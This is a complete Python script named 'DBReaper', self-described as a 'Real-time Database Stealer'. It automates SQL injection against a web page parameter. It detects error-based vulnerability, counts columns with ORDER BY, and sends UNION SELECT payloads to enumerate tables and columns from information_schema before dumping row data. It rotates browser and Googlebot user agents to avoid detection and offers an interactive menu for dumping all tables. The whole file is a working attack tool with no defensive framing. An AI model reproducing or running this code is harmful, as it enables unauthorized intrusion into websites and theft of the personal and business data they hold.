#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# DBReaper v2.0 - Real-time Database Stealer
# Author: Luna Dark

import requests
import sys
import time
import re
import random
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# ========== WARNA ==========
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
P = '\033[95m'
C = '\033[96m'
W = '\033[0m'
H = '\033[1m'

# ========== USER AGENT POOL ==========
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

# ========== ASCII BANNER ==========
BANNER = f"""
    ____  ____  ____                            
   / __ \/ __ )/ __ \___  ____ _____  ___  _____
  / / / / __  / /_/ / _ \/ __ `/ __ \/ _ \/ ___/
 / /_/ / /_/ / _, _/  __/ /_/ / /_/ /  __/ /    
/_____/_____/_/ |_|\___/\__,_/ .___/\___/_/     
                            /_/                      
"""

# ========== CORE ==========
class DBReaper:
    def __init__(self, url, param, delay=0.5, timeout=15):
        self.url = url
        self.param = param
        self.delay = delay
        self.timeout = timeout
        self.session = requests.Session()
        self._rotate_ua()
        self.db_name = ""
        self.user = ""
        self.version = ""
        self.tables = []
        self.cols_cache = {}
        self.data_cache = {}
        
    def _rotate_ua(self):
        self.session.headers.update({"User-Agent": random.choice(UA_POOL)})
        
    def _send(self, payload):
        self._rotate_ua()
        parsed = urlparse(self.url)
        query_dict = parse_qs(parsed.query)
        query_dict[self.param] = [payload]
        new_query = urlencode(query_dict, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_query))
        try:
            r = self.session.get(new_url, timeout=self.timeout)
            time.sleep(self.delay)
            return r.text
        except:
            return ""
            
    def _extract(self, html):
        patterns = [
            r"~DBREAPER~(.*?)~DBREAPER~",
            r"'>([^<]+)<",
            r"<[^>]*>([^<]+)</[^>]*>",
        ]
        for p in patterns:
            m = re.search(p, html)
            if m:
                return m.group(1).strip()
        return ""
        
    def _clean_response(self, html):
        if "~DBREAPER~" in html:
            return html
        return html
        
    def check_vuln(self):
        print(f"\n{Y}[*] {W}Testing vulnerability on {C}{self.url}{W}...")
        normal = self._send("1")
        test = self._send("'")
        errors = ["sql", "mysql", "syntax", "warning", "unclosed", "mariadb", "postgresql"]
        for e in errors:
            if e in test.lower():
                print(f"{G}[+] {W}Vulnerable! Error detected: {Y}{e}{W}")
                return True
        if len(test) != len(normal):
            print(f"{G}[+] {W}Vulnerable! Response length changed.")
            return True
        print(f"{R}[-] {W}No clear vulnerability detected.")
        return False
        
    def get_columns_count(self):
        print(f"\n{Y}[*] {W}Finding column count...")
        for i in range(1, 31):
            resp = self._send(f"' ORDER BY {i}-- -")
            if resp != self._send(f"' ORDER BY {i+1}-- -"):
                continue
            test = self._send(f"' ORDER BY {i}-- -")
            error_test = self._send(f"' ORDER BY {i+1}-- -")
            if len(test) != len(error_test):
                print(f"{G}[+] {W}Columns: {C}{i}{W}")
                return i
        return 0
        
    def get_info(self, cols):
        print(f"\n{Y}[*] {W}Extracting database information...")
        nulls = ",".join(["NULL"] * (cols - 1))
        payload = f"' UNION SELECT {nulls},concat('~DBREAPER~',database(),':',user(),':',version(),'~DBREAPER~')-- -"
        resp = self._send(payload)
        data = self._extract(resp)
        if data and ":" in data:
            parts = data.split(":")
            self.db_name = parts[0] if len(parts) > 0 else "Unknown"
            self.user = parts[1] if len(parts) > 1 else "Unknown"
            self.version = parts[2] if len(parts) > 2 else "Unknown"
            print(f"{G}[+] {W}Database : {C}{self.db_name}{W}")
            print(f"{G}[+] {W}User     : {C}{self.user}{W}")
            print(f"{G}[+] {W}Version  : {C}{self.version}{W}")
            return True
        return False
        
    def dump_tables(self, cols):
        print(f"\n{Y}[*] {W}Dumping tables from {C}{self.db_name}{W}...")
        nulls = ",".join(["NULL"] * (cols - 1))
        payload = f"' UNION SELECT {nulls},concat('~DBREAPER~',table_name,'~DBREAPER~') FROM information_schema.tables WHERE table_schema='{self.db_name}' LIMIT 1 OFFSET {{}}-- -"
        
        tables = []
        for i in range(50):
            resp = self._send(payload.format(i))
            table = self._extract(resp)
            if not table or "UNION" in resp:
                break
            tables.append(table)
            print(f"{G}[+] {W}Table {i+1}: {C}{table}{W}")
        self.tables = tables
        return tables
        
    def dump_columns(self, cols, table):
        print(f"\n{Y}[*] {W}Dumping columns from {C}{table}{W}...")
        nulls = ",".join(["NULL"] * (cols - 1))
        payload = f"' UNION SELECT {nulls},concat('~DBREAPER~',column_name,'~DBREAPER~') FROM information_schema.columns WHERE table_name='{table}' LIMIT 1 OFFSET {{}}-- -"
        
        columns = []
        for i in range(50):
            resp = self._send(payload.format(i))
            col = self._extract(resp)
            if not col:
                break
            columns.append(col)
            print(f"{G}[+] {W}Column {i+1}: {C}{col}{W}")
        self.cols_cache[table] = columns
        return columns
        
    def dump_data(self, cols, table, table_cols, limit=20):
        print(f"\n{Y}[*] {W}Stealing data from {C}{table}{W}...")
        col_str = "concat('~DBREAPER~'," + ",':',".join(table_cols) + ",'~DBREAPER~')"
        nulls = ",".join(["NULL"] * (cols - 1))
        payload = f"' UNION SELECT {nulls},{col_str} FROM {table} LIMIT 1 OFFSET {{}}-- -"
        
        data = []
        for i in range(limit):
            resp = self._send(payload.format(i))
            row = self._extract(resp)
            if not row:
                break
            data.append(row)
        self.data_cache[table] = data
        return data
        
    def display_table(self, table, columns, data):
        print(f"\n{B}┌─────────────────────────────────────────────────────────────┐{W}")
        print(f"{B}│ {W}Table: {C}{table}{W} ({len(data)} rows)")
        print(f"{B}├─────────────────────────────────────────────────────────────┤{W}")
        
        col_width = max([len(c) for c in columns] + [10])
        header = "│ " + " │ ".join([f"{C}{c.ljust(col_width)}{W}" for c in columns]) + " │"
        print(header)
        print(f"{B}├─────────────────────────────────────────────────────────────┤{W}")
        
        for row in data[:10]:
            parts = row.split(":")
            formatted = "│ " + " │ ".join([p.ljust(col_width)[:col_width] for p in parts]) + " │"
            print(formatted)
            
        if len(data) > 10:
            print(f"{B}│ {W}... and {Y}{len(data)-10}{W} more rows ...")
        print(f"{B}└─────────────────────────────────────────────────────────────┘{W}")
        
    def steal_all(self):
        print(BANNER)
        
        if not self.check_vuln():
            print(f"{R}[!] Target not vulnerable. Exiting.{W}")
            return
            
        cols = self.get_columns_count()
        if cols < 1:
            print(f"{R}[!] Cannot determine column count.{W}")
            return
            
        self.get_info(cols)
        self.dump_tables(cols)
        
        if not self.tables:
            print(f"{R}[!] No tables found.{W}")
            return
            
        while True:
            print(f"\n{B}┌─────────────────────────────────────────────────────────────┐{W}")
            print(f"{B}│ {Y}Available Tables:                                           {B}│{W}")
            for i, t in enumerate(self.tables):
                print(f"{B}│ {W}[{C}{i}{W}] {t}")
            print(f"{B}│ {W}[{R}all{W}] Dump all tables")
            print(f"{B}│ {W}[{R}exit{W}] Quit")
            print(f"{B}└─────────────────────────────────────────────────────────────┘{W}")
            
            choice = input(f"\n{G}DBReaper{W} > ").strip()
            
            if choice.lower() == "exit":
                print(f"{R}[!] Shutting down...{W}")
                break
            elif choice.lower() == "all":
                for table in self.tables:
                    if table not in self.cols_cache:
                        table_cols = self.dump_columns(cols, table)
                    else:
                        table_cols = self.cols_cache[table]
                    if table_cols:
                        data = self.dump_data(cols, table, table_cols)
                        self.display_table(table, table_cols, data)
            elif choice.isdigit() and int(choice) < len(self.tables):
                table = self.tables[int(choice)]
                if table not in self.cols_cache:
                    table_cols = self.dump_columns(cols, table)
                else:
                    table_cols = self.cols_cache[table]
                if table_cols:
                    data = self.dump_data(cols, table, table_cols)
                    self.display_table(table, table_cols, data)
            else:
                print(f"{R}[!] Invalid choice{W}")

def main():
    if len(sys.argv) < 3:
        print(BANNER)
        print(f"{Y}Usage: {W}python dbreaper.py <URL> <parameter> [delay]")
        print(f"{Y}Example: {W}python dbreaper.py 'http://target.com/page.php?id=1' id 0.5")
        sys.exit(1)
        
    url = sys.argv[1]
    param = sys.argv[2]
    delay = float(sys.argv[3]) if len(sys.argv) > 3 else 0.5
    
    reaper = DBReaper(url, param, delay)
    reaper.steal_all()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Interrupted by user.{W}")
        sys.exit(0)
